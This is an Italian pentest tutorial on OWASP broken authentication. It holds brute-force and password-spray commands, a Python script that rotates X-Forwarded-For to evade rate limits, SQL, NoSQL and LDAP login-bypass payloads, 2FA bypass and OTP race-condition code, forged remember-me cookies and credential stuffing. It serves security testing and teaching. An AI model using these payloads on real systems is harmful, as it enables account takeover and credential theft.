---
title: 'Broken Authentication: Bypass Login, 2FA e Sessioni'
slug: broken-authentication
description: 'Guida al Broken Authentication OWASP A07: username enumeration, brute force, bypass 2FA, session fixation, password reset e credential stuffing per pentest.'
image: /broken-authentication-owasp-a07.webp
draft: true
date: 2026-08-03T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - broken-authentication
  - owasp
  - authentication
  - 2fa-bypass
  - session-management
---

# Broken Authentication: come testare login, bypass 2FA e sessioni web

Broken Authentication copre tutto quello che può andare storto nel processo di login e nella gestione della sessione: username enumeration, brute force, injection nel form, session management debole, bypass di 2FA, abuse del reset password. Molte di queste tecniche sono triviali ma sistematicamente ignorate nei test.

OWASP A07:2021 include fallimenti sia nell'autenticazione vera e propria che nel session management. La distinzione è importante: sono due attack surface separate con tecniche diverse.

***

## 1. Username enumeration — trova account validi

Prima di attaccare il login, capisci se puoi distinguere tra utente inesistente e password sbagliata. Molte applicazioni rivelano questa informazione involontariamente.

```
# Messaggi diversi → enumerazione possibile
"Email non trovata"          ← utente inesistente
"Password errata"            ← utente esiste

# Timing attack → anche con messaggi identici
# L'applicazione fa query DB solo se l'utente esiste
# Misura il tempo di risposta con Burp Intruder o ffuf
```

```bash
# ffuf per timing attack su username
ffuf -u https://target.com/login \
  -X POST \
  -d "username=FUZZ&password=wrongpassword" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w usernames.txt \
  -t 1 \
  -o results.json \
  -of json

# Analizza i tempi di risposta nell'output — picchi = utente valido

# Burp Intruder → colonna "Response received" e "Response completed"
# Ordina per tempo: i più lenti sono probabilmente utenti esistenti
```

**Altre fonti di enumerazione:**

* Funzione "forgot password" → messaggi diversi per utente valido/invalido
* Funzione "registrazione" → "email già in uso"
* API `/api/users/check?email=test@test.com`
* OAuth login con Google/GitHub → spesso rivela se l'account esiste

***

## 2. Brute force e bypass rate limiting

```bash
# Hydra — brute force HTTP POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -V -t 4

# Con header custom (cookie di sessione se serve)
hydra -l admin -P rockyou.txt target.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=error" \
  -H "Cookie: csrf=abc123"

# Burp Intruder — Pitchfork per user/pass simultanei
# Sniper per solo password su utente noto
```

### Bypass rate limiting — i metodi meno noti

La maggior parte delle implementazioni di rate limiting si basa su IP o session. Entrambi sono bypassabili:

```http
# X-Forwarded-For rotation — bypass IP-based rate limit
POST /login HTTP/1.1
X-Forwarded-For: 1.1.1.1     ← cambia ad ogni richiesta

# Altri header che alcuni backend leggono per determinare l'IP
X-Real-IP: 2.2.2.2
X-Originating-IP: 3.3.3.3
X-Remote-IP: 4.4.4.4
X-Client-IP: 5.5.5.5
True-Client-IP: 6.6.6.6
```

```python
# Script per ruotare X-Forwarded-For
import requests
import random

url = "https://target.com/login"
passwords = open("rockyou.txt").read().splitlines()

for pwd in passwords:
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    r = requests.post(url,
        data={"username": "admin", "password": pwd},
        headers={"X-Forwarded-For": fake_ip}
    )
    if "dashboard" in r.text or r.status_code == 302:
        print(f"[+] Password trovata: {pwd}")
        break
```

**Trick meno noto:** cambia il valore `null` della sessione (logout + nuovo login) tra un tentativo e l'altro se il lock è su sessione e non su IP.

**Password spray vs brute force:** invece di molte password su un account (trigger lockout), prova una password comune su molti account. Stesso risultato, meno rumore:

```bash
# ffuf — spray una password su lista utenti
ffuf -u https://target.com/login \
  -X POST \
  -d "username=FUZZ&password=Summer2024!" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w usernames.txt \
  -mc 302,200 \
  -fs BASELINE_SIZE
```

***

## 3. Injection nel form di login

### SQL Injection

```
# Username field — bypass con commento
admin'--
admin'#
' OR '1'='1
' OR 1=1--
admin' OR '1'='1'--
" OR "1"="1
') OR ('1'='1
' OR 1=1 LIMIT 1--

# Password field
' OR '1'='1
anything' OR '1'='1
```

Lista completa: [HackTricks Login Bypass List](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)

### NoSQL Injection — il trick del JSON (meno noto)

Se il backend accetta JSON nel body del login, prova a mandare un oggetto al posto di una stringa:

```http
POST /login HTTP/1.1
Content-Type: application/json

# Payload normale
{"username": "admin", "password": "wrongpass"}

# Bypass con operatore MongoDB $ne (not equal)
{"username": "admin", "password": {"$ne": ""}}

# Con $gt (greater than) — logica sempre vera
{"username": "admin", "password": {"$gt": ""}}

# Regex — matcha qualsiasi password
{"username": "admin", "password": {"$regex": ".*"}}

# Username anche vulnerabile
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

Se l'app usa `Content-Type: application/x-www-form-urlencoded`, prova la stessa logica con la sintassi dei parametri:

```
username=admin&password[$ne]=wrongpass
username[$regex]=.*&password[$ne]=
```

### LDAP Injection

```
# Username
*
*)(&
*)(|(&
admin)(&
*()|&'

# Password
*)(&
*)(|=*
*()|%26'
```

***

## 4. Session management — le vulnerabilità meno cercate

### Session fixation

L'applicazione accetta un session ID fornito dall'attaccante **prima** del login e lo mantiene anche dopo l'autenticazione. Se riesci a far fare login alla vittima con un session ID che controlli, hai la sessione.

```http
# Step 1 — invia link alla vittima con session ID fisso
https://target.com/login?PHPSESSID=attacker_controlled_id

# Se l'app non rigenera il session ID dopo il login:
# Step 2 — vittima fa login con quell'ID
# Step 3 — attaccante usa lo stesso ID → accede come vittima

# Verifica: il session ID cambia dopo il login?
# In Burp: confronta Set-Cookie prima e dopo il login
```

### Session ID in URL

```
https://target.com/dashboard?session=abc123
# Chiunque veda i log, l'URL condiviso, il Referer header → ha la sessione
```

### Cookie non invalido al logout

Dopo il logout, prova a riutilizzare il cookie vecchio — se l'applicazione non invalida la sessione server-side, sei ancora dentro.

### Cookie prevedibile

```bash
# Analizza il pattern dei session token
# Se sembra base64 → decodifica e guarda la struttura
echo "dXNlcl9pZD00Mg==" | base64 -d
# → user_id=42

# Se è un hash semplice di dati noti (user_id, timestamp)
echo -n "42" | md5sum
echo -n "admin" | sha1sum
```

***

## 5. 2FA bypass — i trick di HackTricks

Questa è la sezione con i trick meno noti, documentati in HackTricks.

### Accedi direttamente allo step successivo

Se l'applicazione ha il flusso `/login` → `/2fa` → `/dashboard`, prova ad accedere direttamente a `/dashboard` dopo il login senza completare il 2FA. In molte implementazioni lo step 2FA è un controllo aggiunto dopo, non un gate obbligatorio.

```http
# Dopo login (prima del 2FA):
GET /dashboard HTTP/1.1
Cookie: session=SESSION_POST_LOGIN
# Se risponde 200 → 2FA bypassato
```

### Manipola il Referer header

```http
POST /verify-2fa HTTP/1.1
Referer: https://target.com/2fa    ← simula navigazione dalla pagina 2FA
Cookie: session=VITTIMA_SESSION
# Alcune app validano solo il Referer, non lo stato interno del flusso
```

### Riusa un token tuo su un altro account

Se il 2FA genera token uguali per tutti gli utenti nello stesso secondo (TOTP mal implementato) o se c'è un bug di validazione:

```http
# Ottieni il tuo codice 2FA (sul tuo account)
# Usalo nella richiesta 2FA della vittima prima che scada
POST /verify-2fa HTTP/1.1
Cookie: session=SESSIONE_VITTIMA

code=123456   ← il tuo codice TOTP valido
```

### Sessioni parallele — bypass per design

1. Apri due browser/sessioni
2. Sessione A: fai login come te (account che controlli), arriva al 2FA
3. Sessione B: fai login come vittima (credenziali rubate), arriva al 2FA
4. Completa il 2FA della Sessione A (tuo account)
5. Nella Sessione B, vai direttamente al passo successivo al 2FA
6. Se il backend usa solo una flag di sessione comune → hai bypassato il 2FA della vittima

### Subdomain senza 2FA

```
# L'app principale ha 2FA
https://app.target.com/login

# Subdomain legacy o staging → stessa sessione, senza 2FA
https://mobile.target.com/login
https://api.target.com/login
https://m.target.com/login
https://legacy.target.com/login
```

### Versioni API precedenti

```
# /api/v2/login richiede 2FA
POST /api/v2/login

# /api/v1/login (versione vecchia) → forse no
POST /api/v1/login
```

### Race condition sul codice OTP

Invia lo stesso codice OTP due volte in parallelo — se non c'è locking atomico, entrambe le richieste vengono validate prima che il codice venga invalidato:

```python
import requests
import threading

def try_otp(code, session):
    r = requests.post("https://target.com/verify-2fa",
        cookies={"session": session},
        data={"code": code})
    print(f"{code}: {r.status_code}")

# Invia 5 richieste parallele con lo stesso codice
threads = []
for _ in range(5):
    t = threading.Thread(target=try_otp, args=("123456", "SESSION"))
    threads.append(t)

for t in threads:
    t.start()
for t in threads:
    t.join()
```

### X-Forwarded-For per bypassare lockout OTP

Se il rate limit sul codice OTP è basato su IP:

```http
POST /verify-2fa HTTP/1.1
X-Forwarded-For: 1.1.1.1   ← cambia ad ogni tentativo
Cookie: session=VITTIMA_SESSION

code=0000
```

***

## 6. Password reset abuse

```http
# Token di reset prevedibile — controlla la struttura
# Se è base64(email:timestamp) → costruisci il token per la vittima

# Testa se il token non ha scadenza
# Richiedi un reset → aspetta 24 ore → usa lo stesso token

# Token legato all'utente sbagliato
# Richiedi reset per il tuo account
# Usa il tuo token nella richiesta di reset della vittima
POST /reset-password HTTP/1.1
email=vittima@target.com&token=IL_TUO_TOKEN
```

Approfondimento completo in [Password Reset Attack](https://hackita.it/articoli/password-reset-attack/).

***

## 7. Remember me — abuse

```http
# Intercetta il cookie "remember me"
# Analizza la struttura: base64, hash, user_id+timestamp?

# Se è user_id codificato:
Cookie: remember_me=dXNlcl9pZD00Mg==
→ base64 -d → user_id=42
→ base64 "user_id=1" → dXNlcl9pZD0x
Cookie: remember_me=dXNlcl9pZD0x    ← admin se ha user_id=1
```

***

## 8. Credential stuffing

```bash
# Con credenziali da breach → wordlist con coppie user:pass
# Usa ffuf con modalità Pitchfork o script custom

# Formato wordlist per stuffing
# user1@email.com:password1
# user2@email.com:password2

ffuf -u https://target.com/login \
  -X POST \
  -request-data "email=W1&password=W2" \
  -w credentials.txt:W1:W2 \   # nota: questa sintassi dipende dalla versione
  -mc 302
  
# Alternativa: script Python con requests + lista coppie
```

***

## Cheat Sheet

```
=== ENUMERATION ===
Messaggi errore diversi → utente valido/invalido
Timing attack con ffuf -t 1 → misura tempi
Forgot password / register → stesse vulnerabilità

=== BRUTE FORCE BYPASS ===
X-Forwarded-For: RANDOM_IP        # bypass IP rate limit
X-Real-IP / X-Client-IP / True-Client-IP
Logout + nuovo session ID         # bypass session-based lockout
Password spray invece di brute    # 1 password × N utenti

=== LOGIN INJECTION ===
SQL: admin'-- / ' OR '1'='1'--
NoSQL JSON: {"password": {"$ne": ""}}
NoSQL param: password[$ne]=x
LDAP: *)(|(&

=== SESSION ===
Controlla se session ID cambia dopo login (fixation)
Riusa cookie dopo logout
Decodifica base64 del cookie → struttura prevedibile?

=== 2FA BYPASS ===
Vai direttamente a /dashboard dopo login
Modifica Referer → simula venire da /2fa
Usa tuo OTP su sessione vittima
Sessioni parallele → completa 2FA su tuo account
Subdomain/api senza 2FA: mobile.*, api.*, /v1/*
Race condition → richieste parallele stesso OTP
X-Forwarded-For → bypass lockout OTP

=== REMEMBER ME ===
base64 -d del cookie → user_id in chiaro?
Costruisci cookie per admin (user_id=1)
```

**Articoli correlati:**

* [Auth e Access Control: guida completa](https://hackita.it/articoli/auth-access-control-guida-completa/)
* [Broken Access Control](https://hackita.it/articoli/broken-access-control/)
* [2FA Bypass](https://hackita.it/articoli/2fa-bypass/)
* [Password Reset Attack](https://hackita.it/articoli/password-reset-attack/)
* [Session Hijacking](https://hackita.it/articoli/session-hijacking/)
* [Brute Force](https://hackita.it/articoli/brute-force/)
* [Burp Suite](https://hackita.it/articoli/burp-suite/)
* [Attacchi Applicazioni Web](https://hackita.it/articoli/attacchi-applicazioni-web/)

> Uso esclusivo in ambienti autorizzati.

\#web-security #broken-authentication #OWASP #2FA-bypass
